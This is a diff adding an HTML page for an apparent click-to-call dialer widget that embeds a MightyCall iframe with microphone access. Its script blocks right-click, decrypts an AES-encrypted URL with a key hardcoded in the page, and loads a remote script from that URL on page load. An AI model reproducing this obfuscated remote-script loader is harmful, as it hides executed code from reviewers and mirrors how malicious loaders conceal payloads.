@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <META NAME="robots" CONTENT="noindex,nofollow">
+    <title>ICBL Dialer3</title>
+    <meta name="viewport" content="width=300">
+    <meta name="generator" content="Serif WebPlus X7 (15,0,0,24)">
+    <!-- Content Security Policy -->
+  <meta http-equiv="Content-Security-Policy" 
+    content="default-src 'self'; 
+             script-src 'self' 'nonce-dch-b0dd5f67' https://click2call.site https://cdnjs.cloudflare.com 'unsafe-inline'; 
+             style-src 'self' 'nonce-dch-b0dd5f67'; 
+             frame-src 'self' https://*.mightycall.com; 
+             connect-src 'self' https://click2call.site https://mightycall.com;">
+	<link rel="icon" href="/dialer/favicon.ico" type="image/x-icon">
+    <style nonce="dch-b0dd5f67">
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: #ffffff;
+        }
+        #divMain {
+            background: transparent;
+            width: 320px;
+            height: 550px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        iframe {
+            width: 320px;
+            height: 550px;
+            border: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="divMain">
+        <iframe id="iframe" allow="microphone"></iframe>
+    </div>
+    <script nonce="dch-b0dd5f67" src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js"></script>
+    <script nonce="dch-b0dd5f67">
+        // Disable right-click context menu
+        document.addEventListener('contextmenu', function(event) {
+            event.preventDefault();
+        });
+
+        // Encrypted URL
+        var encryptedData = '74526288901d9eff2746fb5246ca3bb6f03473f3e415944c69e339ce22d546368e3bcd9732c5112a89fd2bd9c5215a0b';
+        var iv = CryptoJS.enc.Hex.parse('74def916169874e2621228097636d169');
+        var key = CryptoJS.enc.Hex.parse('80250e9da7b5ac3a6d12bf8e040e2e89e8ebd2626740d1cb070f712b4440d9ed');
+
+        try {
+            var decrypted = CryptoJS.AES.decrypt(
+                {
+                    ciphertext: CryptoJS.enc.Hex.parse(encryptedData)
+                },
+                key,
+                {
+                    iv: iv,
+                    mode: CryptoJS.mode.CBC,
+                    padding: CryptoJS.pad.Pkcs7
+                }
+            );
+
+            var decodedData = decrypted.toString(CryptoJS.enc.Utf8);
+            if (!decodedData) {
+                throw new Error('Decryption failed');
+            }
+
+            // Dynamically load the decrypted script
+            var script = document.createElement('script');
+            script.src = decodedData;
+            script.nonce = 'dch-b0dd5f67';
+            document.head.appendChild(script);
+        } catch (error) {
+            console.error('An error occurred during decryption:', error);
+        }
+    </script>
+</body>
+</html>
